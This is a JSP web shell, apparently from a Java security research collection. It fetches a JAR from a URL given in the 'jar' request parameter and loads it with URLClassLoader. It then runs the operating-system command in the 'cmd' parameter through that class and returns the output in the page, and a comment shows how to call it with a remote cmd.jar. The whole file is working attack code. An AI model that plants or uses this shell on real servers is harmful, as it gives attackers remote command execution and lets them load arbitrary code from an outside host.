<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.net.URL" %>
<%@ page import="java.net.URLClassLoader" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%-- urlclassloader.jsp?jar=https://javaweb.org/tools/cmd.jar --%>
<%

    try {
        String         jarUrl = request.getParameter("jar");
        String         cmd    = request.getParameter("cmd");
        URLClassLoader ucl    = new URLClassLoader(new URL[]{new URL(jarUrl)});


        Class cmdClass = ucl.loadClass("CMD");

        Process process = (Process) cmdClass.getMethod("exec", String.class).invoke(null, cmd);

        InputStream           in   = process.getInputStream();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[]                b    = new byte[1024];
        int                   a    = -1;

        // 读取命令执行结果
        while ((a = in.read(b)) != -1) {
            baos.write(b, 0, a);
        }

        // 输出命令执行结果
        out.write(baos.toString());
    } catch (Exception e) {
        e.printStackTrace();
    }
%>